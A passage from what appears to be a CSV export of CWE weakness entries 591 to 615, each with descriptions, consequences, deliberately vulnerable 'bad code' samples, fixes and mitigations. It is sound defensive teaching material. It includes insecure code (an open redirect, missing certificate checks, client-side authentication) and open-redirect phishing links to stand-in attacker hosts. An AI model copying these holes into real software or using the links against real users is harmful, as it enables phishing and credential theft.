interesting with bar */...free(bar);}","Phase:  ImplementationOnly free pointers that you have called malloc on previously. This is the recommended solution. Keep track of which pointers point at the beginning of valid chunks and free them only once.Phase:  ImplementationBefore freeing a pointer, the programmer should make sure that the pointer was previously allocated on the heap and that the memory belongs to the programmer. Freeing an unallocated pointer will cause undefined behavior in the program.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, glibc in Linux provides protection against free of invalid pointers.Phase:  Architecture and DesignUse a language that provides abstractions for memory allocation and deallocation.Phase:  TestingUse a tool that dynamically detects memory management problems, such as valgrind."
CWE-591: Sensitive Data Storage in Improperly Locked Memory,"The product stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read MemorySensitive data that is written to a swap file may be exposed., Likelihood: ",无示范例子,Phase:  Architecture and DesignIdentify data that needs to be protected from swapping and choose platform-appropriate protection mechanisms.Phase:  ImplementationCheck return values to ensure locking operations are successful.
CWE-592: DEPRECATED: Authentication Bypass Issues,This weakness has been deprecated because it covered redundant concepts already described inCWE-287.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created,The product modifies the SSL context after connection creation has begun.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismNo authentication takes place in this process, bypassing an assumed protection of encryption., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe encrypted communication between a user and a trusted host may be subject to a sniffing attack., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:C#define CERT ""secret.pem""#define CERT2 ""secret2.pem""int main(){SSL_CTX *ctx;SSL *ssl;init_OpenSSL();seed_prng();ctx = SSL_CTX_new(SSLv23_method());if (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1)int_error(""Error loading certificate from file"");if (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1)int_error(""Error loading private key from file"");if (!(ssl = SSL_new(ctx)))int_error(""Error creating an SSL context"");if ( SSL_CTX_set_default_passwd_cb(ctx, ""new default password"" != 1))int_error(""Doing something which is dangerous to do anyways"");if (!(ssl2 = SSL_new(ctx)))int_error(""Error creating an SSL context"");}","Phase:  Architecture and DesignUse a language or a library that provides a cryptography framework at a higher level of abstraction.Phase:  ImplementationMost SSL_CTX functions have SSL counterparts that act on SSL-type objects.Phase:  ImplementationApplications should set up an SSL_CTX completely, before creating SSL objects from it."
CWE-594: J2EE Framework: Saving Unserializable Objects to Disk,When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataData represented by unserializable objects can be corrupted., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartNon-serializability of objects can lead to system crash., Likelihood: ","Example 1In the following Java example, a Customer Entity JavaBean provides access to customer information in a database for a business application. The Customer Entity JavaBean is used as a session scoped object to return customer information to a Session EJB.(bad code)Example Language:Java@Entitypublic class Customer {private String id;private String firstName;private String lastName;private Address address;public Customer() {}public Customer(String id, String firstName, String lastName) {...}@Idpublic String getCustomerId() {...}public void setCustomerId(String id) {...}public String getFirstName() {...}public void setFirstName(String firstName) {...}public String getLastName() {...}public void setLastName(String lastName) {...}@OneToOne()public Address getAddress() {...}public void setAddress(Address address) {...}}However, the Customer Entity JavaBean is an unserialized object which can cause serialization failure and crash the application when the J2EE container attempts to write the object to the system. Session scoped objects must implement the Serializable interface to ensure that the objects serialize properly.(good code)Example Language:Javapublic class Customer implements Serializable {...}",Phases:  Architecture and Design; ImplementationAll objects that become part of session and application scope must implement the java.io.Serializable interface to ensure serializability of containing objects.
CWE-595: Comparison of Object References Instead of Object Contents,"The product compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.","Scope: Other, Impact: Technical Impact:Varies by ContextThis weakness can lead to erroneous results that can cause unexpected application behaviors., Likelihood: ","Example 1In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent.(bad code)Example Language:JavaString str1 = new String(""Hello"");String str2 = new String(""Hello"");if (str1 == str2) {System.out.println(""str1 == str2"");}However, the if statement will not be executed as the strings are compared using the ""=="" operator. For Java objects, such as String objects, the ""=="" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:(good code)if (str1.equals(str2)) {System.out.println(""str1 equals str2"");}Example 2In the following Java example, two BankAccount objects are compared in the isSameAccount method using the == operator.(bad code)Example Language:Javapublic boolean isSameAccount(BankAccount accountA, BankAccount accountB) {return accountA == accountB;}Using the == operator to compare objects may produce incorrect or deceptive results by comparing object references rather than values. The equals() method should be used to ensure correct results or objects should contain a member variable that uniquely identifies the object.The following example shows the use of the equals() method to compare the BankAccount objects and the next example uses a class get method to retrieve the bank account number that uniquely identifies the BankAccount object to compare the objects.(good code)Example Language:Javapublic boolean isSameAccount(BankAccount accountA, BankAccount accountB) {return accountA.equals(accountB);}","Phase:  ImplementationIn Java, use the equals() method to compare objects instead of the == operator. If using ==, it is important for performance reasons that your objects are created by a static factory, not by a constructor."
CWE-596: DEPRECATED: Incorrect Semantic Object Comparison,This weakness has been deprecated. It was poorly described and difficult to distinguish from other entries. It was also inappropriate to assign a separate ID solely because of domain-specific considerations. Its closest equivalent isCWE-1023.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-597: Use of Wrong Operator in String Comparison,"The product uses the wrong operator when comparing a string, such as using ""=="" when the .equals() method should be used instead.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent.(bad code)Example Language:JavaString str1 = new String(""Hello"");String str2 = new String(""Hello"");if (str1 == str2) {System.out.println(""str1 == str2"");}However, the if statement will not be executed as the strings are compared using the ""=="" operator. For Java objects, such as String objects, the ""=="" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:(good code)if (str1.equals(str2)) {System.out.println(""str1 equals str2"");}Example 2In the example below, three JavaScript variables are declared and initialized with the same values. Note that JavaScript will change a value between numeric and string as needed, which is the reason an integer is included with the strings. An if statement is used to determine whether the values are the same.(bad code)Example Language:JavaScript<p id=""ieq3s1"" type=""text"">(i === s1) is FALSE</p><p id=""s4eq3i"" type=""text"">(s4 === i) is FALSE</p><p id=""s4eq3s1"" type=""text"">(s4 === s1) is FALSE</p>var i = 65;var s1 = '65';var s4 = new String('65');if (i === s1){document.getElementById(""ieq3s1"").innerHTML = ""(i === s1) is TRUE"";}if (s4 === i){document.getElementById(""s4eq3i"").innerHTML = ""(s4 === i) is TRUE"";}if (s4 === s1){document.getElementById(""s4eq3s1"").innerHTML = ""(s4 === s1) is TRUE"";}However, the body of the if statement will not be executed, as the ""==="" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails. The types in the second are int and reference, so this one fails as well. The types in the third are reference and string, so it also fails.While the variables above contain the same values, they are contained in different types, so the document.getElementById... statement will not be executed in any of the cases.To compare object values, the previous code is modified and shown below to use the ""=="" for value comparison so the comparison in this example executes the HTML statement:(good code)Example Language:JavaScript<p id=""ieq2s1"" type=""text"">(i == s1) is FALSE</p><p id=""s4eq2i"" type=""text"">(s4 == i) is FALSE</p><p id=""s4eq2s1"" type=""text"">(s4 == s1) is FALSE</p>var i = 65;var s1 = '65';var s4 = new String('65');if (i == s1){document.getElementById(""ieq2s1"").innerHTML = ""(i == s1) is TRUE"";}if (s4 == i){document.getElementById(""s4eq2i"").innerHTML = ""(s4 == i) is TRUE"";}if (s4 == s1){document.getElementById(""s4eq2s1"").innerHTML = ""(s4 == s1) is TRUE"";}Example 3In the example below, two PHP variables are declared and initialized with the same numbers - one as a string, the other as an integer. Note that PHP will change the string value to a number for a comparison. An if statement is used to determine whether the values are the same.(bad code)Example Language:PHPvar $i = 65;var $s1 = ""65"";if ($i === $s1){echo '($i === $s1) is TRUE'. ""\n"";}else{echo '($i === $s1) is FALSE'. ""\n"";}However, the body of the if statement will not be executed, as the ""==="" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails.While the variables above contain the same values, they are contained in different types, so the TRUE portion of the if statement will not be executed.To compare object values, the previous code is modified and shown below to use the ""=="" for value comparison (string converted to number) so the comparison in this example executes the TRUE statement:(good code)Example Language:PHPvar $i = 65;var $s1 = ""65"";if ($i == $s1){echo '($i == $s1) is TRUE'. ""\n"";}else{echo '($i == $s1) is FALSE'. ""\n"";}","Phase:  ImplementationWithin Java, use .equals() to compare string values.Within JavaScript, use == to compare string values.Within PHP, use == to compare a numeric value to a string value. (PHP converts the string to a number.)Effectiveness: High"
CWE-598: Use of GET Request Method With Sensitive Query Strings,The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataAt a minimum, attackers can garner information from query strings that can be utilized in escalating their method of attack, such as information about the internal workings of the application or database column names. Successful exploitation of query string parameter vulnerabilities could lead to an attacker impersonating a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers., Likelihood: ",无示范例子,"Phase:  ImplementationWhen sensitive information is sent, use the POST method (e.g. registration form)."
CWE-599: Missing Validation of OpenSSL Certificate,The product uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe data read may not be properly secured, it might be viewed by an attacker., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityTrust afforded to the system in question may allow for spoofing or redirection attacks., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf the certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data under the guise of a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid, and that it pertains to the site we wish to access., Likelihood: ","Example 1The following OpenSSL code ensures that the host has a certificate.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {// got certificate, host can be trusted//foo=SSL_get_verify_result(ssl);//if (X509_V_OK==foo) ...}Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.",Phase:  Architecture and DesignEnsure that proper authentication is included in the system design.Phase:  ImplementationUnderstand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.
CWE-600: Uncaught Exception in Servlet,"The Servlet does not catch all exceptions, which may reveal sensitive debugging information.","Scope: ConfidentialityAvailability, Impact: Technical Impact:Read Application Data; DoS: Crash, Exit, or Restart, Likelihood: ","Example 1The following example attempts to resolve a hostname.(bad code)Example Language:Javaprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {String ip = req.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);...out.println(""hello "" + addr.getHostName());}A DNS lookup failure will cause the Servlet to throw an exception.",Phase:  ImplementationImplement Exception blocks to handle all types of Exceptions.
CWE-601: URL Redirection to Untrusted Site ('Open Redirect'),"A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityThe user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data., Likelihood: ; Scope: Access ControlConfidentialityOther, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity; OtherThe user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site., Likelihood: ","Example 1The following code obtains a URL from the query string and then redirects the user to that URL.(bad code)Example Language:PHP$redirect_url = $_GET['url'];header(""Location: "" . $redirect_url);The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:(attack code)http://example.com/example.php?url=http://malicious.example.comThe user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place.Example 2The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.(bad code)Example Language:Javapublic class RedirectServlet extends HttpServlet {protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {String query = request.getQueryString();if (query.contains(""url"")) {String url = request.getParameter(""url"");response.sendRedirect(url);}}}The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:(attack code)Example Language:HTML<a href=""http://bank.example.com/redirect?url=http://attacker.example.net"">Click here to log in</a>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Use a list of approved URLs or domains to be used for redirection.Phase:  Architecture and DesignUse an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.For example, ID 1 could map to ""/login.asp"" and ID 2 could map to ""http://www.example.com/"". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.Phase:  Architecture and DesignEnsure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).Note:Note that this can be bypassed using XSS (CWE-79).Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."
CWE-602: Client-Side Enforcement of Server-Side Security,The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.,"Scope: Access ControlAvailability, Impact: Technical Impact:Bypass Protection Mechanism; DoS: Crash, Exit, or RestartClient-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityClient-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions., Likelihood: ","Example 1This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step.CLIENT-SIDE (client.pl)(good code)Example Language:Perl$server = ""server.example.com"";$username = AskForUserName();$password = AskForPassword();$address = AskForAddress();$sock = OpenSocket($server, 1234);writeSocket($sock, ""AUTH $username $password\n"");$resp = readSocket($sock);if ($resp eq ""success"") {# username/pass is valid, go ahead and update the info!writeSocket($sock, ""CHANGE-ADDRESS $username $address\n"";}else {print ""ERROR: Invalid Authentication!\n"";}SERVER-SIDE (server.pl):(bad code)$sock = acceptSocket(1234);($cmd, $args) = ParseClientRequest($sock);if ($cmd eq ""AUTH"") {($username, $pass) = split(/\s+/, $args, 2);$result = AuthenticateUser($username, $pass);writeSocket($sock, ""$result\n"");# does not close the socket on failure; assumes the# user will try again}elsif ($cmd eq ""CHANGE-ADDRESS"") {if (validateAddress($args)) {$res = UpdateDatabaseRecord($username, ""address"", $args);writeSocket($sock, ""SUCCESS\n"");}else {writeSocket($sock, ""FAILURE -- address is malformed\n"");}}The server accepts 2 commands, ""AUTH"" which authenticates the user, and ""CHANGE-ADDRESS"" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the ""AUTH"" command and simply executing the CHANGE-ADDRESS.Example 2In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used client-side authentication in their OT products.","Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.Phase:  Architecture and DesignIf some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path.Phase:  TestingUse dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.Phase:  TestingUse tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
CWE-603: Use of Client-Side Authentication,"A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity, Likelihood: ","Example 1In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used client-side authentication in their OT products.",Phase:  Architecture and DesignDo not rely on client side data. Always perform server side authentication.
CWE VIEW: Deprecated Entries,CWE nodes in this view (slice) have been deprecated. There should be a reference pointing to the replacement in each deprecated weakness.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-605: Multiple Binds to the Same Port,"When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application DataPackets from a variety of network services may be stolen or the services spoofed., Likelihood: ","Example 1This code binds a server socket to port 21, allowing the server to listen for traffic on that port.(bad code)Example Language:Cvoid bind_socket(void) {int server_sockfd;int server_len;struct sockaddr_in server_address;/*unlink the socket if already bound to avoid an error when bind() is called*/unlink(""server_socket"");server_sockfd = socket(AF_INET, SOCK_STREAM, 0);server_address.sin_family = AF_INET;server_address.sin_port = 21;server_address.sin_addr.s_addr = htonl(INADDR_ANY);server_len = sizeof(struct sockaddr_in);bind(server_sockfd, (struct sockaddr *) &s1, server_len);}This code may result in two servers binding a socket to same port, thus receiving each other's traffic. This could be used by an attacker to steal packets meant for another process, such as a secure FTP server.",Phase:  PolicyRestrict server socket address to known local addresses.
CWE-606: Unchecked Input for Loop Condition,"The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU), Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cvoid iterate(int n){int i;for (i = 0; i < n; i++){foo();}}void iterateFoo(){unsigned int num;scanf(""%u"",&num);iterate(num);}Example 2In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing.(bad code)Example Language:Cint processMessageFromSocket(int socket) {int success;char buffer[BUFFER_SIZE];char message[MESSAGE_SIZE];// get message from socket and store into buffer//Ignoring possibliity that buffer > BUFFER_SIZEif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {// place contents of the buffer into message structureExMessage *msg = recastBuffer(buffer);// copy message body into string for processingint index;for (index = 0; index < msg->msgLength; index++) {message[index] = msg->msgBody[index];}message[index] = '\0';// process messagesuccess = processMessage(message);}return success;}However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130).",Phase:  ImplementationDo not use user-controlled data for loop conditions.Phase:  ImplementationPerform input validation.
CWE-607: Public Static Final Field References Mutable Object,"A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.","Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ","Example 1Here, an array (which is inherently mutable) is labeled public static final.(bad code)Example Language:Javapublic static final String[] USER_ROLES;",Phase:  ImplementationProtect mutable objects by making them private. Restrict access to the getter and setter as well.
CWE-608: Struts: Non-private Field in ActionForm Class,"An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Application Data; Read Application Data, Likelihood: ","Example 1In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for a online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data.(bad code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// variables for registration formpublic String name;public String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}...}However, within the RegistrationForm the member variables for the registration form input data are declared public not private. All member variables within a Struts framework ActionForm class must be declared private to prevent the member variables from being modified without using the getter and setter methods. The following example shows the member variables being declared private and getter and setter methods declared for accessing the member variables.(good code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}// getter and setter methods for private variables...}",Phase:  ImplementationMake all fields private. Use getter to get the value of the field. Setter should be used only by the framework; setting an action form field from other actions is bad practice and should be avoided.
CWE-609: Double-Checked Locking,"The product uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.","Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; Alter Execution Logic, Likelihood: ","Example 1It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization...(bad code)Example Language:Javaif (helper == null) {synchronized (this) {if (helper == null) {helper = new Helper();}}}return helper;The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called.Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute:(bad code)helper = new Helper();If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values.","Phase:  ImplementationWhile double-checked locking can be achieved in some languages, it is inherently flawed in Java before 1.5, and cannot be achieved without compromising platform independence. Before Java 1.5, only use of the synchronized keyword is known to work. Beginning in Java 1.5, use of the ""volatile"" keyword allows double-checked locking to work successfully, although there is some debate as to whether it achieves sufficient performance gains. See references."
CWE-610: Externally Controlled Reference to a Resource in Another Sphere,The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ","Example 1The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.(bad code)Example Language:Javapublic class RedirectServlet extends HttpServlet {protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {String query = request.getQueryString();if (query.contains(""url"")) {String url = request.getParameter(""url"");response.sendRedirect(url);}}}The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:(attack code)Example Language:HTML<a href=""http://bank.example.com/redirect?url=http://attacker.example.net"">Click here to log in</a>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.",无可能的缓解方案
CWE-611: Improper Restriction of XML External Entity Reference,"The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesIf the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Bypass Protection MechanismThe DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)The product could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing., Likelihood: ",无示范例子,Phases:  Implementation; System ConfigurationMany XML parsers and validators can be configured to disable external entity expansion.
CWE-612: Improper Authorization of Index Containing Sensitive Information,"The product creates a search index of private or sensitive documents, but it does not properly limit index access to actors who are authorized to see the original information.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-613: Insufficient Session Expiration,"According to WASC, ""Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.""","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire.(bad code)Example Language:Java<web-app>[...snipped...]<session-config><session-timeout>-1</session-timeout></session-config></web-app>",Phase:  ImplementationSet sessions/credentials expiration date.
CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The snippet of code below, taken from a servlet doPost() method, sets an accountID cookie (sensitive) without calling setSecure(true).(bad code)Example Language:JavaCookie c = new Cookie(ACCOUNT_ID, acctID);response.addCookie(c);",Phase:  ImplementationAlways set the secure attribute when the cookie should sent via HTTPS only.
CWE-615: Inclusion of Sensitive Information in Source Code Comments,"While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following comment, embedded in a JSP, will be displayed in the resulting HTML output.(bad code)Example Language:JSP<!-- FIXME: calling this with more than 30 args kills the JDBC server -->",Phase:  DistributionRemove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application.
